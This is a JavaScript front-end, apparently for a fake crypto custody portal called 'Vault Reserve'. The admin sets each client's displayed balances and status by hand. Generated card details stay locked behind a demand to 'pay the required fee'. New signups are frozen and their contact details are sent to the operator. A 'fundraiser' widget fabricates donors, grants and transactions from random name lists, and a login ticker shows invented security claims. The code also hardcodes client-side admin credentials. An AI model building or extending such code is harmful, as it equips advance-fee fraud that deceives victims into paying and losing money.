// ════════════════════════════════════
// DATA STORE
// ════════════════════════════════════
const ADMIN = { username: 'admin', password: 'admin@vault', name: 'Administrator' };
const DEFAULT_DELIVERY_TIME = '2-4 business days after approval';
// Optional phone push hook. Example with ntfy:
// 1. Install the ntfy phone app.
// 2. Subscribe to a hard-to-guess topic name.
// 3. Put that topic URL here, e.g. https://ntfy.sh/your-private-signup-topic
const SIGNUP_NOTIFICATION_URL = '';

function randomDigits(length) {
  return Array.from({ length }, () => Math.floor(Math.random() * 10)).join('');
}

function generateCardNumber() {
  return ['4539', randomDigits(4), randomDigits(4), randomDigits(4)].join(' ');
}

function generateExpiry() {
  const now = new Date();
  const year = now.getFullYear() + 3;
  const month = String((now.getMonth() % 12) + 1).padStart(2, '0');
  return `${month} / ${String(year).slice(-2)}`;
}

function createCardProfile() {
  return {
    number: generateCardNumber(),
    cvv: randomDigits(3),
    expiry: generateExpiry(),
    brand: 'Vault Reserve',
  };
}

function normalizeClient(client) {
  const card = { ...createCardProfile(), ...(client.card || {}) };
  return {
    ...client,
    status: client.status || 'procedure',
    deliveryTime: client.deliveryTime || DEFAULT_DELIVERY_TIME,
    card,
  };
}

function getClients() {
  try { return JSON.parse(localStorage.getItem('sv_clients') || '[]').map(normalizeClient); }
  catch { return []; }
}

function saveClients(clients) {
  localStorage.setItem('sv_clients', JSON.stringify(clients.map(normalizeClient)));
}

let currentUser    = null;
let deleteTargetId = null;
let editingId      = null;

// ════════════════════════════════════
// PAGE ROUTING
// ════════════════════════════════════
function showPage(id) {
  ['page-login','page-admin','page-client'].forEach(p => {
    document.getElementById(p).classList.toggle('hidden', p !== id);
  });
}

// ════════════════════════════════════
// LOGIN
// ════════════════════════════════════
document.getElementById('btn-login').addEventListener('click', doLogin);
document.getElementById('btn-signup').addEventListener('click', doSignup);
document.getElementById('login-pass').addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });
document.getElementById('login-user').addEventListener('keydown', e => { if (e.key === 'Enter') document.getElementById('login-pass').focus(); });
document.getElementById('signup-pass').addEventListener('keydown', e => { if (e.key === 'Enter') doSignup(); });
document.getElementById('btn-login').classList.add('auth-login-only');
document.getElementById('login-error').classList.add('auth-login-only');

function switchAuthView(view) {
  const isLogin = view === 'login';
  document.querySelectorAll('.auth-toggle-btn').forEach(btn => {
    btn.classList.toggle('active', btn.dataset.authView === view);
  });
  document.querySelectorAll('.auth-login-only').forEach(el => {
    el.classList.toggle('hidden', !isLogin);
  });
  document.getElementById('auth-view-signup').classList.toggle('hidden', isLogin);
  document.getElementById('auth-subtitle').textContent = isLogin
    ? 'Authorized Personnel Only'
    : 'Create Your Client Account';
  document.getElementById('login-error').style.display = 'none';
  document.getElementById('signup-error').style.display = 'none';
}

function showAuthError(id, message) {
  const el = document.getElementById(id);
  el.textContent = message;
  el.style.display = 'block';
}

function clearSignupForm() {
  ['signup-fullname', 'signup-phone', 'signup-user', 'signup-pass'].forEach(id => {
    document.getElementById(id).value = '';
  });
  document.getElementById('signup-error').style.display = 'none';
}

function notifySignup(client) {
  if (!SIGNUP_NOTIFICATION_URL) return;

  const message = [
    'New signup received',
    `Name: ${client.fullname}`,
    `Email: ${client.username}`,
    `Phone: ${client.phone}`,
  ].join('\n');

  fetch(SIGNUP_NOTIFICATION_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
    body: message,
  }).catch(err => {
    console.warn('Signup notification failed:', err);
  });
}

function doLogin() {
  const u = document.getElementById('login-user').value.trim();
  const p = document.getElementById('login-pass').value;
  const errEl = document.getElementById('login-error');

  if (u === ADMIN.username && p === ADMIN.password) {
    currentUser = { role: 'admin', ...ADMIN };
    errEl.style.display = 'none';
    renderOverview();
    showPage('page-admin');
    return;
  }

  const clients = getClients();
  const client  = clients.find(c => c.username === u && c.password === p);
  if (client) {
    currentUser = { role: 'client', ...client };
    errEl.style.display = 'none';
    loadClientDashboard(client);
    showPage('page-client');
    return;
  }

  errEl.style.display = 'block';
  document.getElementById('login-pass').value = '';
}

function doSignup() {
  const fullname = document.getElementById('signup-fullname').value.trim();
  const phone = document.getElementById('signup-phone').value.trim();
  const email = document.getElementById('signup-user').value.trim().toLowerCase();
  const password = document.getElementById('signup-pass').value;

  if (!fullname || !phone || !email || !password) {
    showAuthError('signup-error', '// All signup fields are required');
    return;
  }
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    showAuthError('signup-error', '// Enter a valid email address');
    return;
  }

  const clients = getClients();
  if (email === ADMIN.username || clients.some(client => client.username === email)) {
    showAuthError('signup-error', '// Email is already registered');
    return;
  }

  const client = normalizeClient({
    id: 'c_' + Date.now(),
    fullname,
    username: email,
    phone,
    password,
    usdc: 0,
    usdt: 0,
    status: 'frozen',
    deliveryTime: DEFAULT_DELIVERY_TIME,
  });

  clients.push(client);
  saveClients(clients);
  notifySignup(client);
  clearSignupForm();
  currentUser = { role: 'client', ...client };
  loadClientDashboard(client);
  showPage('page-client');
  toast('Client account created');
}

function logout() {
  currentUser = null;
  stopFundraiser();
  ctStop();
  document.getElementById('login-user').value = '';
  document.getElementById('login-pass').value = '';
  document.getElementById('login-error').style.display = 'none';
  clearSignupForm();
  switchAuthView('login');
  showPage('page-login');
}

// ════════════════════════════════════
// ADMIN NAVIGATION
// ════════════════════════════════════
function adminNav(btn) {
  document.querySelectorAll('#page-admin .nav-item').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');

  const view = btn.dataset.view;
  document.querySelectorAll('#page-admin .view').forEach(v => v.classList.remove('active'));
  document.getElementById('view-' + view).classList.add('active');

  const labels = {
    'admin-overview':   'OVERVIEW',
    'admin-clients':    'CLIENT REGISTRY',
    'admin-new-client': editingId ? 'EDIT CLIENT' : 'DEPLOY CLIENT',
    'admin-agents':     editingAgentId ? 'EDIT AGENT' : 'SUPPORT AGENTS',
  };
  document.getElementById('admin-breadcrumb').textContent = labels[view] || view.toUpperCase();

  if (view === 'admin-clients')    renderClientsTable();
  if (view === 'admin-overview')   renderOverview();
  if (view === 'admin-agents')     { renderAgentsTable(); populateAgentAssignList(); }
}

// ════════════════════════════════════
// ADMIN OVERVIEW
// ════════════════════════════════════
function renderOverview() {
  const clients   = getClients();
  const totalUsdc = clients.reduce((s, c) => s + (parseFloat(c.usdc) || 0), 0);
  const totalUsdt = clients.reduce((s, c) => s + (parseFloat(c.usdt) || 0), 0);
  const totalAum  = totalUsdc + totalUsdt;

  document.getElementById('stat-total-clients').textContent = clients.length;
  document.getElementById('stat-total-usdc').textContent    = '$' + fmt(totalUsdc);
  document.getElementById('stat-total-usdt').textContent    = '$' + fmt(totalUsdt);
  document.getElementById('stat-total-aum').textContent     = '$' + fmt(totalAum);

  const el = document.getElementById('overview-recent-clients');
  if (!clients.length) {
    el.innerHTML = '<div class="empty-state"><div class="empty-state-txt">// NO CLIENT RECORDS — DEPLOY FIRST ACCOUNT</div></div>';
    return;
  }

  const recent = clients.slice().reverse().slice(0, 5);
  el.innerHTML = `
    <table class="data-table">
      <thead><tr><th>Username</th><th>Full Name</th><th>USDC</th><th>USDT</th><th>Total USD</th></tr></thead>
      <tbody>
        ${recent.map(c => `
          <tr>
            <td class="td-mono">${esc(c.username)}</td>
            <td>${esc(c.fullname)}</td>
            <td><div class="crypto-amount"><span class="crypto-dot dot-usdc"></span>$${fmt(c.usdc||0)}</div></td>
            <td><div class="crypto-amount"><span class="crypto-dot dot-usdt"></span>$${fmt(c.usdt||0)}</div></td>
            <td class="td-primary">$${fmt((parseFloat(c.usdc)||0)+(parseFloat(c.usdt)||0))}</td>
          </tr>`).join('')}
      </tbody>
    </table>`;
}

// ════════════════════════════════════
// CLIENT REGISTRY TABLE
// ════════════════════════════════════
function renderClientsTable() {
  const clients   = getClients();
  const container = document.getElementById('clients-table-container');

  if (!clients.length) {
    container.innerHTML = '<div class="empty-state"><div class="empty-state-txt">// NO CLIENT RECORDS — DEPLOY FIRST ACCOUNT</div></div>';
    return;
  }

  container.innerHTML = `
    <table class="data-table">
      <thead>
        <tr>
          <th>Username</th><th>Full Name</th><th>Phone</th>
          <th>USDC</th><th>USDT</th><th>Total USD</th><th>Status</th><th>Delivery</th><th>Actions</th>
        </tr>
      </thead>
      <tbody>
        ${clients.map(c => `
          <tr>
            <td class="td-mono">${esc(c.username)}</td>
            <td>${esc(c.fullname)}</td>
            <td class="td-mono">${esc(c.phone)}</td>
            <td><div class="crypto-amount"><span class="crypto-dot dot-usdc"></span>$${fmt(c.usdc||0)}</div></td>
            <td><div class="crypto-amount"><span class="crypto-dot dot-usdt"></span>$${fmt(c.usdt||0)}</div></td>
            <td class="td-primary">$${fmt((parseFloat(c.usdc)||0)+(parseFloat(c.usdt)||0))}</td>
            <td>${renderStatusBadge(c.status || 'activated')}</td>
            <td class="td-mono">${esc(c.deliveryTime || 'Pending')}</td>
            <td>
              <div class="table-actions">
                <button class="btn-ghost" onclick="editClient('${c.id}')">EDIT</button>
                <button class="btn-danger" onclick="openDeleteModal('${c.id}','${esc(c.username)}')">DELETE</button>
              </div>
            </td>
          </tr>`).join('')}
      </tbody>
    </table>`;
}

// ════════════════════════════════════
// CLIENT CRUD
// ════════════════════════════════════
const STATUS_META = {
  activated: { label: 'Approved',       cls: 'case-activated' },
  procedure: { label: 'Pending Review', cls: 'case-procedure' },
  closed:    { label: 'Restricted',     cls: 'case-closed'    },
  frozen:    { label: 'Frozen',         cls: 'case-closed'    },
};

function isClientApproved(client) {
  return (client?.status || 'procedure') === 'activated';
}

function getLockedCardMessage() {
  return 'Pay the required fee before these protected card details become available. They unlock once your status turns green and approved.';
}

function renderStatusBadge(status) {
  const m = STATUS_META[status] || STATUS_META.activated;
  return `<span class="case-badge ${m.cls}" style="font-size:7.5px;padding:4px 10px 4px 8px">
    <span class="case-badge-dot"></span>${m.label}
  </span>`;
}

function selectStatus(status) {
  document.querySelectorAll('#cf-status-selector .status-opt').forEach(btn => {
    btn.classList.remove('selected-activated', 'selected-procedure', 'selected-closed', 'selected-frozen');
    if (btn.dataset.status === status) btn.classList.add('selected-' + status);
  });
}

document.getElementById('cf-status-selector').addEventListener('click', function(e) {
  const btn = e.target.closest('.status-opt');
  if (btn) selectStatus(btn.dataset.status);
});

function getSelectedStatus() {
  const sel = document.querySelector('#cf-status-selector .status-opt[class*="selected-"]');
  return sel ? sel.dataset.status : 'activated';
}

function createClient() {
  const fullname = document.getElementById('cf-fullname').value.trim();
  const username = document.getElementById('cf-username').value.trim().toLowerCase();
  const phone    = document.getElementById('cf-phone').value.trim();
  const password = document.getElementById('cf-password').value;
  const usdc     = parseFloat(document.getElementById('cf-usdc').value) || 0;
  const usdt     = parseFloat(document.getElementById('cf-usdt').value) || 0;
  const status   = getSelectedStatus();
  const deliveryTime = document.getElementById('cf-delivery-time').value.trim() || DEFAULT_DELIVERY_TIME;
  const msgEl    = document.getElementById('form-msg');

  if (!fullname || !username || !phone || !password) {
    showMsg(msgEl, '// ALL FIELDS REQUIRED', 'error'); return;
  }
  if (!/^[a-z0-9_]+$/.test(username)) {
    showMsg(msgEl, '// USERNAME: LOWERCASE ALPHANUMERIC ONLY', 'error'); return;
  }

  const clients = getClients();

  const assignedAgents = getCheckedAgentIds();

  if (editingId) {
    const idx = clients.findIndex(c => c.id === editingId);
    if (idx === -1) { showMsg(msgEl, '// CLIENT NOT FOUND', 'error'); return; }
    if (clients.find(c => c.username === username && c.id !== editingId)) {
      showMsg(msgEl, '// USERNAME ALREADY REGISTERED', 'error'); return;
    }
    clients[idx] = normalizeClient({ ...clients[idx], fullname, username, phone, password, usdc, usdt, status, deliveryTime, agents: assignedAgents });
    saveClients(clients);
    clearClientForm();
    showMsg(msgEl, '// CLIENT UPDATED SUCCESSFULLY', 'success');
    toast('Client record updated');
  } else {
    if (username === ADMIN.username || clients.find(c => c.username === username)) {
      showMsg(msgEl, '// USERNAME ALREADY REGISTERED', 'error'); return;
    }
    clients.push(normalizeClient({ id: 'c_' + Date.now(), fullname, username, phone, password, usdc, usdt, status, deliveryTime, agents: assignedAgents }));
    saveClients(clients);
    clearClientForm();
    showMsg(msgEl, '// CLIENT DEPLOYED SUCCESSFULLY', 'success');
    toast('Client ' + username + ' created');
  }

  renderOverview();
}

function clearClientForm() {
  ['cf-fullname','cf-username','cf-phone','cf-password','cf-usdc','cf-usdt','cf-delivery-time']
    .forEach(id => { document.getElementById(id).value = ''; });
  selectStatus('activated');
  editingId = null;
  document.getElementById('btn-client-submit').textContent = 'DEPLOY CLIENT →';
  document.getElementById('new-client-form-title').textContent = 'DEPLOY NEW CLIENT';
  populateAgentAssignList();
}

function editClient(id) {
  const c = getClients().find(cl => cl.id === id);
  if (!c) return;
  adminNav(document.querySelector('[data-view="admin-new-client"]'));
  document.getElementById('cf-fullname').value = c.fullname;
  document.getElementById('cf-username').value  = c.username;
  document.getElementById('cf-phone').value     = c.phone;
  document.getElementById('cf-password').value  = c.password;
  document.getElementById('cf-usdc').value      = c.usdc;
  document.getElementById('cf-usdt').value      = c.usdt;
  document.getElementById('cf-delivery-time').value = c.deliveryTime || '';
  selectStatus(c.status || 'activated');
  editingId = id;
  populateAgentAssignList(c.agents || []);
  document.getElementById('btn-client-submit').textContent = 'UPDATE CLIENT →';
  document.getElementById('new-client-form-title').textContent = 'EDIT CLIENT';
  document.getElementById('admin-breadcrumb').textContent = 'EDIT CLIENT';
}

function openDeleteModal(id, username) {
  deleteTargetId = id;
  document.getElementById('delete-modal-body').textContent =
    'Permanently terminate account "' + username + '"? This cannot be undone.';
  document.getElementById('delete-modal').classList.add('show');
}

function closeDeleteModal() {
  deleteTargetId = null;
  document.getElementById('delete-modal').classList.remove('show');
}

function confirmDelete() {
  if (!deleteTargetId) return;
  const clients = getClients().filter(c => c.id !== deleteTargetId);
  saveClients(clients);
  closeDeleteModal();
  renderClientsTable();
  renderOverview();
  toast('Client terminated', true);
}

// Close modal on overlay click
document.getElementById('delete-modal').addEventListener('click', function(e) {
  if (e.target === this) closeDeleteModal();
});

// ════════════════════════════════════
// CLIENT DASHBOARD
// ════════════════════════════════════
function clientNav(btn) {
  document.querySelectorAll('#page-client .nav-item').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  const view = btn.dataset.view;
  document.querySelectorAll('#page-client .view').forEach(v => v.classList.remove('active'));
  document.getElementById('view-' + view).classList.add('active');
  const labels = {
    'client-portfolio': 'HOLDINGS',
    'client-card': 'CARD',
    'client-withdraw': 'WITHDRAW FUNDS',
    'client-support': 'SUPPORT'
  };
  if (view === 'client-withdraw') wdInitView();
  document.getElementById('client-breadcrumb').textContent = labels[view] || view.toUpperCase();
}

function renderClientCardSection(client) {
  const approved = isClientApproved(client);
  const card = client.card || createCardProfile();
  const bullet = String.fromCharCode(8226);
  const maskedNumber = Array(4).fill(bullet.repeat(4)).join(' ');

  document.getElementById('client-cardholder-name').textContent = client.fullname;
  document.getElementById('client-card-masked-number').textContent = '•••• •••• •••• ••••';
  document.getElementById('client-card-expiry').textContent = approved ? card.expiry : '•• / ••';
  document.getElementById('client-card-cvv').textContent = approved ? card.cvv : '•••';
  document.getElementById('client-card-delivery').textContent = approved ? (client.deliveryTime || DEFAULT_DELIVERY_TIME) : 'Locked until approval';
  document.getElementById('client-card-status-text').textContent = approved ? 'Approved / Unlocked' : 'Awaiting fee clearance';
  document.getElementById('client-card-masked-number').textContent = maskedNumber;
  document.getElementById('client-card-expiry').textContent = approved ? card.expiry : `${bullet}${bullet} / ${bullet}${bullet}`;
  document.getElementById('client-card-cvv').textContent = approved ? card.cvv : bullet.repeat(3);
  document.getElementById('client-card-state-banner').textContent = approved ? 'Approved access' : 'Protected until approval';
  document.getElementById('client-card-detail-stack').classList.toggle('is-locked', !approved);
  document.getElementById('client-card-lock-message').classList.toggle('hidden', approved);
  document.getElementById('client-card-lock-message').textContent = getLockedCardMessage();
}

function loadClientDashboard(client) {
  const normalizedClient = normalizeClient(client);
  currentUser = { role: 'client', ...normalizedClient };
  client = normalizedClient;
  const usdc  = parseFloat(client.usdc) || 0;
  const usdt  = parseFloat(client.usdt) || 0;
  const total = usdc + usdt;

  // Case status badge in header
  const statusMeta = STATUS_META[client.status || 'activated'] || STATUS_META.activated;
  const badgeEl    = document.getElementById('client-case-badge');
  badgeEl.className = 'case-badge ' + statusMeta.cls;
  document.getElementById('client-case-label').textContent = statusMeta.label;

  // Countdown timer — only runs when status is "procedure" (Case Active)
  ctStop();
  if ((client.status || 'activated') === 'procedure') {
    ctStart(client.id);
  }

  // Sidebar
  const initials = client.fullname.split(' ').map(w => w[0]).join('').slice(0, 2).toUpperCase();
  document.getElementById('client-avatar').textContent        = initials;
  document.getElementById('client-display-name').textContent  = client.fullname;
  document.getElementById('client-role-tag').textContent      = 'CLIENT';
  const usernameTag = document.getElementById('client-username-tag');
  if (usernameTag) usernameTag.textContent = '@' + client.username;

  // Holdings view
  document.getElementById('client-total').textContent        = fmt(total);
  document.getElementById('client-usdc-val').textContent     = '$' + fmt(usdc);
  document.getElementById('client-usdt-val').textContent     = '$' + fmt(usdt);

  // Allocation bars + percentages
  const usdcPct = total > 0 ? Math.round((usdc / total) * 100) : 50;
  const usdtPct = total > 0 ? Math.round((usdt / total) * 100) : 50;

  // Defer so CSS transitions fire after paint
  requestAnimationFrame(() => {
    // Hero bar
    document.getElementById('hero-bar-usdc').style.width  = usdcPct + '%';
    document.getElementById('hero-bar-usdt').style.width  = usdtPct + '%';
    document.getElementById('hero-alloc-usdc').textContent = 'USDC ' + usdcPct + '%';
    document.getElementById('hero-alloc-usdt').textContent = 'USDT ' + usdtPct + '%';
    // Card fill bars
    document.getElementById('usdc-fill-bar').style.width  = usdcPct + '%';
    document.getElementById('usdt-fill-bar').style.width  = usdtPct + '%';
    // Percentage labels on cards
    document.getElementById('client-usdc-pct').textContent = usdcPct + '%';
    document.getElementById('client-usdt-pct').textContent = usdtPct + '%';
  });

  // Support tab
  renderClientSupport(client);
  renderClientCardSection(client);

  // Reset to holdings tab
  document.querySelectorAll('#page-client .view').forEach(v => v.classList.remove('active'));
  document.getElementById('view-client-portfolio').classList.add('active');
  document.querySelectorAll('#page-client .nav-item').forEach(b => b.classList.remove('active'));
  document.querySelector('#page-client [data-view="client-portfolio"]').classList.add('active');
  document.getElementById('client-breadcrumb').textContent = 'HOLDINGS';

  // Start fundraiser simulation when client logs in
  stopFundraiser();
  frCurrent = FR_START; frTotalDep = FR_START; frTotalWdr = frTxCount = 0; frDone = false;
  const frLog = document.getElementById('fr-log');
  if (frLog) frLog.innerHTML = '<div class="fr-empty">// Awaiting next transaction...</div>';
  const frFill = document.getElementById('fr-fill');
  if (frFill) { frFill.className = 'fr-fill'; frFill.style.background = 'linear-gradient(90deg, #0E6640 0%, #1A9060 50%, #28C87A 100%)'; }
  frUpdateUI();
  startFundraiser();
}

// ════════════════════════════════════
// UTILITIES
// ════════════════════════════════════
function fmt(n) {
  return Number(n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function esc(str) {
  return String(str || '')
    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function showMsg(el, msg, type) {
  el.textContent    = msg;
  el.className      = 'form-msg ' + type;
  el.style.display  = 'inline';
  setTimeout(() => { el.style.display = 'none'; }, 3500);
}

function toast(msg, isError = false) {
  const el = document.getElementById('toast');
  el.textContent = '// ' + msg.toUpperCase();
  el.className   = 'toast' + (isError ? ' error-toast' : '');
  el.classList.add('show');
  setTimeout(() => el.classList.remove('show'), 2800);
}

// ════════════════════════════════════
// SEED DEMO CLIENT (first run only)
// ════════════════════════════════════
(function seedDemo() {
  const existing = getClients();
  if (existing.find(c => c.username === 'demo')) return;
  existing.push({
    id: 'c_demo',
    fullname: 'Demo Client',
    username: 'demo',
    password: 'demo1234',
    phone: '+1 555 000 0001',
    usdc: 12500,
    usdt: 8750,
    status: 'activated',
    deliveryTime: '1-2 business days',
  });
  saveClients(existing);
})();

// LIVE CLOCK
// ════════════════════════════════════
function updateClocks() {
  const t = new Date().toTimeString().slice(0, 8);
  document.getElementById('admin-clock').textContent  = t;
  document.getElementById('client-clock').textContent = t;
}
setInterval(updateClocks, 1000);
updateClocks();

// ════════════════════════════════════
// LOGIN PAGE DECORATIONS
// ════════════════════════════════════
// Void grid cells
(function() {
  const grid = document.getElementById('void-grid');
  if (!grid) return;
  for (let i = 0; i < 600; i++) {
    const cell = document.createElement('div');
    cell.className = 'void-grid-cell';
    grid.appendChild(cell);
  }
})();

// Ticker data
const voidTicker = document.getElementById('void-ticker');
if (voidTicker) {
  voidTicker.innerHTML = [
    ['SYSTEM STATUS',     'ONLINE'],
    ['ENCRYPTION',        'AES-256-GCM'],
    ['BLOCKCHAIN',        'MAINNET'],
    ['USDC PEG',          '$1.00 USD'],
    ['USDT PEG',          '$1.00 USD'],
    ['SESSION TIMEOUT',   '30 MINUTES'],
    ['TLS VERSION',       '1.3'],
    ['LAST AUDIT',        '2026-04-01'],
    ['NODE COUNT',        '12 ACTIVE'],
  ].map(([k, v]) => `<div>${k.padEnd(24, '.')} <span>${v}</span></div>`).join('');
}

// ════════════════════════════════════
// FUNDRAISER WIDGET
// ════════════════════════════════════
const FR_GOAL      = 1_000_000;
const FR_START     = Math.floor(Math.random() * (80_000 - 70_000 + 1)) + 70_000;
let frCurrent  = 0;
let frTotalDep = 0;
let frTotalWdr = 0;
let frTxCount  = 0;
let frDepTimer = null;
let frWdrTimer = null;
let frDone     = false;

const FR_FIRST = ['James','Michael','Robert','William','David','Richard','Joseph','Thomas','Charles','Christopher','Daniel','Matthew','Anthony','Mark','Donald','Steven','Paul','Andrew','Joshua','Kenneth','Kevin','Brian','George','Timothy','Ronald','Edward','Jason','Jeffrey','Ryan','Jacob','Gary','Nicholas','Eric','Jonathan','Stephen','Larry','Justin','Scott','Brandon','Benjamin','Samuel','Frank','Gregory','Raymond','Patrick','Alexander','Jack','Dennis','Jerry','Tyler','Aaron','Jose','Henry','Adam','Douglas','Nathan','Peter','Zachary','Kyle','Walter','Harold','Jeremy','Ethan','Carl','Keith','Roger','Gerald','Christian','Terry','Sean','Arthur','Austin','Noah','Lawrence','Jesse','Joe','Bryan','Billy','Louis','Jordan','Dylan','Bruce','Ralph','Roy','Alan','Gloria','Patricia','Jennifer','Linda','Barbara','Susan','Dorothy','Lisa','Nancy','Karen','Betty','Helen','Sandra','Donna','Carol','Ruth','Sharon','Michelle','Laura','Sarah','Kimberly','Deborah','Jessica','Shirley','Cynthia','Angela','Melissa','Brenda','Amy','Anna','Rebecca','Virginia','Kathleen','Pamela','Martha','Debra','Amanda','Stephanie','Carolyn','Christine','Marie','Janet','Catherine','Frances'];

const FR_LAST = ['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis','Rodriguez','Martinez','Hernandez','Lopez','Gonzalez','Wilson','Anderson','Thomas','Taylor','Moore','Jackson','Martin','Lee','Perez','Thompson','White','Harris','Sanchez','Clark','Ramirez','Lewis','Robinson','Walker','Young','Allen','King','Wright','Scott','Torres','Nguyen','Hill','Flores','Green','Adams','Nelson','Baker','Hall','Rivera','Campbell','Mitchell','Carter','Roberts','Turner','Phillips','Evans','Collins','Stewart','Morris','Morales','Murphy','Cook','Rogers','Gutierrez','Ortiz','Morgan','Cooper','Peterson','Bailey','Reed','Kelly','Howard','Ramos','Kim','Cox','Ward','Richardson','Watson','Brooks','Chavez','Wood','James','Bennett','Gray','Mendoza','Ruiz','Hughes','Price','Alvarez','Castillo','Sanders','Patel','Myers','Long','Ross','Foster','Jimenez'];

const FR_DEP_PHRASES = [
  n => `${n} contributed to the American Strength Fund`,
  n => `${n} invested in From the Streets to Strength`,
  n => `${n} supported the American Strength Fund Program`,
  n => `${n} joined the American Strength Fund initiative`,
  n => `${n} donated to rebuild communities through ASF`,
  n => `${n} backed the From the Streets to Strength program`,
  n => `${n} pledged support to the American Strength Fund`,
  n => `${n} helped fund a second chance for those in need`,
  n => `${n} made a contribution toward community recovery`,
  n => `${n} invested in restoring dignity & opportunity`,
];

const FR_WDR_PHRASES = [
  (n, a) => `Grant of $${a} awarded to ${n} — housing deposit covered`,
  (n, a) => `${n} received $${a} in job training assistance`,
  (n, a) => `$${a} disbursed to ${n} for small business startup`,
  (n, a) => `${n} granted $${a} — tools & equipment funded`,
  (n, a) => `Community grant of $${a} delivered to ${n}`,
  (n, a) => `${n} received $${a} — From the Streets to Strength`,
  (n, a) => `$${a} released to ${n} for rent & stability support`,
  (n, a) => `${n} — $${a} vocational grant approved & sent`,
  (n, a) => `Verified recipient ${n} received $${a} in direct aid`,
  (n, a) => `${n} granted $${a} toward rebuilding their future`,
];

function frRandName() {
  const f = FR_FIRST[Math.floor(Math.random() * FR_FIRST.length)];
  const l = FR_LAST[Math.floor(Math.random() * FR_LAST.length)];
  return f + ' ' + l;
}

const frFmtFull = n =>
  Math.max(0, n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

const frFmtShort = n =>
  Math.abs(n).toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 });

const frFmtCompact = n => {
  const a = Math.abs(n);
  if (a >= 1_000_000) return '$' + (a / 1_000_000).toFixed(2) + 'M';
  if (a >= 1_000)     return '$' + (a / 1_000).toFixed(1) + 'K';
  return '$' + frFmtShort(a);
};

function frUpdateUI() {
  const pct = Math.min((frCurrent / FR_GOAL) * 100, 100);
  const fill  = document.getElementById('fr-fill');
  const track = document.getElementById('fr-track');
  if (!fill) return;

  fill.style.width = Math.max(pct, 0.5) + '%';
  document.getElementById('fr-amount').textContent    = frFmtFull(frCurrent);
  document.getElementById('fr-pct').textContent       = pct.toFixed(2) + '% Funded';
  document.getElementById('fr-remaining').textContent = frCurrent >= FR_GOAL
    ? '✓ Goal Reached!' : '$' + frFmtShort(FR_GOAL - frCurrent) + ' remaining';
  document.getElementById('fr-stat-dep').textContent  = frFmtCompact(frTotalDep);
  document.getElementById('fr-stat-wdr').textContent  = frFmtCompact(frTotalWdr);
  document.getElementById('fr-stat-tx').textContent   = frTxCount;
  document.getElementById('fr-log-count').textContent =
    frTxCount + (frTxCount === 1 ? ' entry' : ' entries');

  const pctEl = document.getElementById('fr-pct');
  pct >= 100 ? pctEl.classList.add('green') : pctEl.classList.remove('green');
}

function frAddLog(type, amount) {
  const log = document.getElementById('fr-log');
  if (!log) return;

  const empty = log.querySelector('.fr-empty');
  if (empty) empty.remove();

  const time   = new Date().toTimeString().slice(0, 8);
  const isDep  = type === 'dep';
  const name   = frRandName();
  const amtStr = frFmtShort(amount);

  let desc;
  if (isDep) {
    const phrase = FR_DEP_PHRASES[Math.floor(Math.random() * FR_DEP_PHRASES.length)];
    desc = phrase(name);
  } else {
    const phrase = FR_WDR_PHRASES[Math.floor(Math.random() * FR_WDR_PHRASES.length)];
    desc = phrase(name, amtStr);
  }

  const el = document.createElement('div');
  el.className = 'fr-entry';
  el.innerHTML = `
    <span class="fr-etime">${time}</span>
    <span class="fr-badge ${type}">${isDep ? 'IN' : 'OUT'}</span>
    <span class="fr-edesc">${desc}</span>
    <span class="fr-eamt ${type}">${isDep ? '+' : '−'}$${amtStr}</span>
  `;
  log.appendChild(el);
  requestAnimationFrame(() => { log.scrollTop = log.scrollHeight; });
}

function frDeposit() {
  if (frDone) return;
  const amount = Math.floor(Math.random() * (3000 - 700 + 1)) + 700;
  frCurrent   = Math.min(frCurrent + amount, FR_GOAL);
  frTotalDep += amount;
  frTxCount++;

  const fill  = document.getElementById('fr-fill');
  const track = document.getElementById('fr-track');
  const amtEl = document.getElementById('fr-amount');
  if (!fill) return;

  fill.style.background = 'linear-gradient(90deg, #0E6640 0%, #1A9060 50%, #28C87A 100%)';
  fill.classList.remove('do-bounce');
  track.classList.remove('do-shake', 'red-state', 'glow-state');
  void fill.offsetWidth;
  fill.classList.add('do-bounce');
  track.classList.add('glow-state');
  setTimeout(() => { fill.classList.remove('do-bounce'); track.classList.remove('glow-state'); }, 700);

  amtEl.classList.add('flash-green');
  setTimeout(() => amtEl.classList.remove('flash-green'), 500);

  frUpdateUI();
  frAddLog('dep', amount);
  if (frCurrent >= FR_GOAL) frGoalReached();
}

function frWithdrawal() {
  if (frCurrent <= 0) return;
  const amount = Math.floor(Math.random() * (10000 - 8000 + 1)) + 8000;
  frCurrent   = Math.max(frCurrent - amount, 0);
  frTotalWdr += amount;
  frTxCount++;

  const fill  = document.getElementById('fr-fill');
  const track = document.getElementById('fr-track');
  const amtEl = document.getElementById('fr-amount');
  if (!fill) return;

  fill.style.background = 'linear-gradient(90deg, #6B1510 0%, #C03830 50%, #E05045 100%)';
  fill.classList.remove('do-bounce');
  track.classList.remove('glow-state', 'do-shake');
  void track.offsetWidth;
  track.classList.add('do-shake', 'red-state');
  setTimeout(() => {
    fill.style.background = 'linear-gradient(90deg, #0E6640 0%, #1A9060 50%, #28C87A 100%)';
    track.classList.remove('do-shake', 'red-state');
  }, 650);

  amtEl.classList.add('flash-red');
  setTimeout(() => amtEl.classList.remove('flash-red'), 500);

  frUpdateUI();
  frAddLog('wdr', amount);
}

function frGoalReached() {
  frDone = true;
  clearInterval(frDepTimer);
  clearInterval(frWdrTimer);
  const fill = document.getElementById('fr-fill');
  if (fill) fill.style.background = 'linear-gradient(90deg, #9A7B0A 0%, #C9A84C 50%, #E8C96A 100%)';
}

function startFundraiser() {
  frDone = false;
  frDepTimer = setInterval(frDeposit,    2000);
  frWdrTimer = setInterval(frWithdrawal, 15000);
}

function stopFundraiser() {
  clearInterval(frDepTimer);
  clearInterval(frWdrTimer);
}

function frReset() {
  stopFundraiser();
  frCurrent = FR_START; frTotalDep = FR_START; frTotalWdr = frTxCount = 0;
  frDone = false;
